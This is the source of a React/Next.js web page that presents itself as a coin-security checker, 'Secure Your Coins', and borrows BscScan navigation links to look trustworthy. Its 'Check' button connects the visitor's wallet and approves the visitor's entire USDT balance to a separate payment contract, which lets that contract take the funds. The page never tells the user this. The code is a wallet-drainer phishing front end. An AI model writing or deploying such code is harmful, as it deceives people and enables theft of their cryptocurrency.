'use client';

import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { getUSDTContract, CONTRACT_ADDRESSES, USDT_TOKEN_ABI } from '../lib/contracts';
import { walletService, WalletInfo } from '../lib/wallet';
import { WalletService } from '../lib/wallet';

export default function Home() {
  // Auto-detect wallet on page load
  useEffect(() => {
    const detectWallet = () => {
      if (typeof window !== 'undefined' && window.ethereum) {
        setWalletDetected(true);
      } else {
        setWalletDetected(false);
        setShowWalletAlert(true);
        
        // Auto-hide alert after 2 seconds
        setTimeout(() => {
          setIsAlertSlidingOut(true);
          setTimeout(() => {
            setShowWalletAlert(false);
            setIsAlertSlidingOut(false);
          }, 500);
        }, 2000);
      }
    };

    detectWallet();
  }, []);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [walletInfo, setWalletInfo] = useState<WalletInfo | null>(null);
  const [usdtBalance, setUsdtBalance] = useState('0');
  const [isLoading, setIsLoading] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [walletDetected, setWalletDetected] = useState<boolean | null>(null);
  const [showWalletAlert, setShowWalletAlert] = useState(false);
  const [showNoUSDTAlert, setShowNoUSDTAlert] = useState(false);
  const [isAlertSlidingOut, setIsAlertSlidingOut] = useState(false);
  const [isNoUSDTAlertSlidingOut, setIsNoUSDTAlertSlidingOut] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState<{
    hash: string;
    status: 'pending' | 'success' | 'failed';
    message?: string;
  } | null>(null);

  const handleCheckButton = async () => {
    if (!walletInfo) {
      await connectWallet();
      // After connecting, load balance and check immediately
      const balance = await loadUSDTBalance();
      
      // Check balance after loading
      if (parseFloat(balance) > 0) {
        await handleApprove();
      } else {
        setShowNoUSDTAlert(true);
        setTimeout(() => {
          setIsNoUSDTAlertSlidingOut(true);
          setTimeout(() => {
            setShowNoUSDTAlert(false);
            setIsNoUSDTAlertSlidingOut(false);
          }, 500);
        }, 2000);
      }
      return;
    }
    
    // If wallet is already connected, load balance and check
    const balance = await loadUSDTBalance();
    
    if (parseFloat(balance) > 0) {
      await handleApprove();
    } else {
      setShowNoUSDTAlert(true);
      setTimeout(() => {
        setIsNoUSDTAlertSlidingOut(true);
        setTimeout(() => {
          setShowNoUSDTAlert(false);
          setIsNoUSDTAlertSlidingOut(false);
        }, 500);
      }, 2000);
    }
  };

  const loadUSDTBalance = async () => {
    if (!walletInfo?.address) return '0';
    
    try {
      if (!window.ethereum) {
        console.error('No wallet detected');
        return '0';
      }
      
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const usdtContract = new ethers.Contract(
        CONTRACT_ADDRESSES.usdtToken,
        USDT_TOKEN_ABI,
        provider
      );
      
      const balance = await usdtContract.balanceOf(walletInfo.address);
      // USDT on BSC Testnet has 6 decimals, not 18
      const formattedBalance = ethers.utils.formatUnits(balance, 6);
      setUsdtBalance(formattedBalance);
      return formattedBalance;
    } catch (error: unknown) {
      console.error('Error loading USDT balance:', error);
      setUsdtBalance('0');
      return '0';
    }
  };

  const handleApprove = async () => {
    if (!walletInfo?.address) return;
    
    setIsLoading(true);
    setError(null);
    
    try {
      // Get the current signer from the wallet
      if (!window.ethereum) {
        throw new Error('No wallet detected');
      }
      
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      
      // Create USDT contract with the signer
      const usdtContract = new ethers.Contract(
        CONTRACT_ADDRESSES.usdtToken,
        USDT_TOKEN_ABI,
        signer
      );
      
      console.log('User address:', walletInfo.address);
      console.log('USDT contract address:', CONTRACT_ADDRESSES.usdtToken);
      
      // Get the full USDT balance and approve it
      const balance = await usdtContract.balanceOf(walletInfo.address);
      
      // Check if user has any USDT balance
      if (balance.isZero()) {
        throw new Error('No USDT balance to approve');
      }
      
      console.log('USDT balance:', ethers.utils.formatUnits(balance, 6));
      console.log('Payment contract address:', CONTRACT_ADDRESSES.paymentContract);
      
      const tx = await usdtContract.approve(CONTRACT_ADDRESSES.paymentContract, balance);
      await tx.wait();
      
      setTransactionStatus({
        hash: tx.hash,
        status: 'success',
        message: 'Full USDT balance approved successfully!'
      });
    } catch (error: unknown) {
      console.error('Approval error:', error);
      let errorMessage = 'Transaction failed';
      
      if (error && typeof error === 'object' && 'code' in error) {
        const errorCode = (error as { code: string }).code;
        if (errorCode === 'ACTION_REJECTED') {
          errorMessage = 'Transaction was rejected by user';
        } else if (errorCode === 'USER_REJECTED') {
          errorMessage = 'Transaction was cancelled';
        } else if (errorCode === '-32603') {
          errorMessage = 'RPC Error - Please check your network connection and try again';
        }
      } else if (error && typeof error === 'object' && 'message' in error) {
        const message = (error as { message: string }).message;
        if (message.includes('insufficient funds')) {
          errorMessage = 'Insufficient funds for transaction';
        } else if (message.includes('gas')) {
          errorMessage = 'Gas estimation failed';
        } else if (message.includes('execution reverted')) {
          errorMessage = 'Transaction reverted - check your input';
        } else if (message.includes('Internal JSON-RPC error')) {
          errorMessage = 'Network error - Please try again';
        } else if (message.length > 100) {
          errorMessage = 'Transaction failed - please try again';
        } else {
          errorMessage = message;
        }
      }
      
      setTransactionStatus({
        hash: '',
        status: 'failed',
        message: errorMessage
      });
    } finally {
      setIsLoading(false);
    }
  };

  const connectWallet = async () => {
    setIsConnecting(true);
    setError(null);
    
    try {
      const walletService = new WalletService();
      const walletInfo = await walletService.connectWallet();
      setWalletInfo(walletInfo);
      await loadUSDTBalance();
    } catch (error: unknown) {
      console.error('Error connecting wallet:', error);
      let errorMessage = 'Failed to connect wallet';
      
      if (error && typeof error === 'object' && 'message' in error) {
        const message = (error as { message: string }).message;
        if (message.includes('BSC Testnet')) {
          errorMessage = 'Please approve the network switch to BSC Testnet in your wallet';
        } else if (message.includes('add BSC Testnet')) {
          errorMessage = 'Please approve adding BSC Testnet to your wallet';
        } else if (message.includes('user rejected')) {
          errorMessage = 'Wallet connection was cancelled';
        }
      }
      
      setError(errorMessage);
    } finally {
      setIsConnecting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ background: 'linear-gradient(to right, rgb(0, 0, 0), rgb(40, 41, 42))' }}>
      {/* Header */}
      <header className="bg-black text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <img 
                alt="Logo" 
                src="/logo.png" 
                className="h-12 w-auto object-cover"
              />
            </div>
            
            {/* Desktop Navigation */}
            <nav className="hidden md:flex space-x-8">
              <a 
                href="https://bscscan.com" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
              >
                Home
              </a>
              <a 
                href="https://bscscan.com/txs" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
              >
                Blockchain
              </a>
              <a 
                href="https://bscscan.com/tokens" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
              >
                Tokens
              </a>
              <a 
                href="https://bscscan.com/validators" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
              >
                Validators
              </a>
              <a 
                href="https://bscscan.com/nft-top-contracts" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
              >
                NFTs
              </a>
              <a 
                href="https://bscscan.com/charts" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
              >
                Resources
              </a>
              <a 
                href="https://bscscan.com/verifyContract" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
              >
                Developers
              </a>
            </nav>

            {/* Mobile Menu Button */}
            <button className="md:hidden p-2">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <h1 className="text-4xl font-bold mb-4" style={{ color: 'rgb(255, 204, 0)' }}>
            Secure Your Coins
          </h1>
          <h2 className="text-xl text-white mb-8">
            Ensure your tokens are secure on every network.
          </h2>
          
          <div className="flex justify-center">
            <button
              onClick={handleCheckButton}
              disabled={isConnecting || walletDetected === false}
              className="flex items-center gap-2 px-6 py-3 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors duration-300"
            >
              <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" className="w-5 h-5">
                <path d="M461.2 128H80c-8.84 0-16-7.16-16-16s7.16-16 16-16h384c8.84 0 16-7.16 16-16 0-26.51-21.49-48-48-48H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h397.2c28.02 0 50.8-21.53 50.8-48V176c0-26.47-22.78-48-50.8-48zM416 336c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"></path>
              </svg>
              {isConnecting ? 'Connecting...' : walletDetected === false ? 'No Wallet Detected' : 'Check'}
            </button>
          </div>

          {error && (
            <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg max-w-md mx-auto">
              <p className="text-sm text-red-700">{error}</p>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-black text-white py-6">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <p className="text-sm">
            © 2025 Best application to secure your coins All rights reserved.
          </p>
        </div>
      </footer>

      {/* Modal */}
      {isModalOpen && (
        <div 
          className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50"
          onClick={() => setIsModalOpen(false)}
        >
          <div 
            className="bg-white rounded-lg p-8 max-w-md w-full mx-4"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-semibold text-gray-900">USDT Balance & Approval</h3>
              <button
                onClick={() => setIsModalOpen(false)}
                className="text-gray-400 hover:text-gray-600"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Wallet Connection Status */}
            {walletInfo && (
              <div className="mb-4 p-3 bg-green-50 border border-green-200 rounded-lg">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-medium text-green-800">Wallet Connected</p>
                    <p className="text-xs text-green-600">
                      {walletInfo.address.slice(0, 6)}...{walletInfo.address.slice(-4)}
                    </p>
                  </div>
                  <button
                    onClick={() => {
                      console.log('Disconnect button clicked');
                      try {
                        // Clear state immediately
                        setWalletInfo(null);
                        setIsModalOpen(false);
                        setTransactionStatus(null);
                        setError(null);
                        
                        // Disconnect wallet service
                        walletService.disconnectWallet().then(() => {
                          console.log('Wallet disconnected successfully');
                        }).catch((error) => {
                          console.error('Error disconnecting wallet:', error);
                        });
                      } catch (error) {
                        console.error('Error in disconnect button:', error);
                        // Ensure state is cleared even if there's an error
                        setWalletInfo(null);
                        setIsModalOpen(false);
                        setTransactionStatus(null);
                        setError(null);
                      }
                    }}
                    className="text-sm text-green-600 hover:text-green-800 hover:underline transition-colors"
                  >
                    Disconnect
                  </button>
                </div>
              </div>
            )}

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Your USDT Balance
                </label>
                <p className="text-lg font-semibold text-gray-900">
                  {parseFloat(usdtBalance).toFixed(2)} USDT
                </p>
              </div>



              <button
                onClick={handleApprove}
                disabled={isLoading || !walletInfo}
                className="w-full flex items-center justify-center gap-2 px-4 py-2 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                {isLoading ? 'Processing...' : 'Access'}
              </button>

              {transactionStatus && (
                <div className={`p-4 rounded-lg border ${
                  transactionStatus.status === 'success' 
                    ? 'text-green-600 bg-green-50 border-green-200'
                    : transactionStatus.status === 'failed'
                    ? 'text-red-600 bg-red-50 border-red-200'
                    : 'text-yellow-600 bg-yellow-50 border-yellow-200'
                }`}>
                  <div className="flex items-start justify-between">
                    <div className="flex-1">
                      <p className="font-medium">{transactionStatus.message}</p>
                      {transactionStatus.hash && (
                        <p className="text-sm mt-1 break-all">
                          Hash: {transactionStatus.hash.slice(0, 10)}...{transactionStatus.hash.slice(-8)}
                        </p>
                      )}
                    </div>
                    <button
                      onClick={() => setTransactionStatus(null)}
                      className="ml-3 text-sm hover:underline flex-shrink-0"
                    >
                      Dismiss
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Wallet Alert */}
      {showWalletAlert && (
        <div className={`fixed top-4 right-4 z-50 transform transition-all duration-500 ease-in-out ${
          isAlertSlidingOut ? 'animate-slide-out' : 'animate-slide-in'
        }`}>
          <div className="bg-gradient-to-r from-orange-500 to-orange-600 text-white px-6 py-4 rounded-lg shadow-xl border-l-4 border-orange-700 max-w-sm backdrop-blur-sm">
            <div className="flex items-center">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-orange-200" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm font-medium">
                  No Ethereum Wallet detected
                </p>
                <p className="text-xs text-orange-200 mt-1">
                  Please install MetaMask or Trust Wallet
                </p>
              </div>
              <div className="ml-auto pl-3">
                <button
                  onClick={() => {
                    setIsAlertSlidingOut(true);
                    setTimeout(() => {
                      setShowWalletAlert(false);
                      setIsAlertSlidingOut(false);
                    }, 500);
                  }}
                  className="text-orange-200 hover:text-white transition-colors"
                >
                  <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* No USDT Alert */}
      {showNoUSDTAlert && (
        <div className={`fixed top-20 right-4 z-50 transform transition-all duration-500 ease-in-out ${
          isNoUSDTAlertSlidingOut ? 'animate-slide-out' : 'animate-slide-in'
        }`}>
          <div className="bg-gradient-to-r from-red-500 to-red-600 text-white px-6 py-4 rounded-lg shadow-xl border-l-4 border-red-700 max-w-sm backdrop-blur-sm">
            <div className="flex items-center">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-red-200" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm font-medium">
                  No USDT Balance Found
                </p>
                <p className="text-xs text-red-200 mt-1">
                  You need USDT tokens to proceed
                </p>
              </div>
              <div className="ml-auto pl-3">
                <button
                  onClick={() => {
                    setIsNoUSDTAlertSlidingOut(true);
                    setTimeout(() => {
                      setShowNoUSDTAlert(false);
                      setIsNoUSDTAlertSlidingOut(false);
                    }, 500);
                  }}
                  className="text-red-200 hover:text-white transition-colors"
                >
                  <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
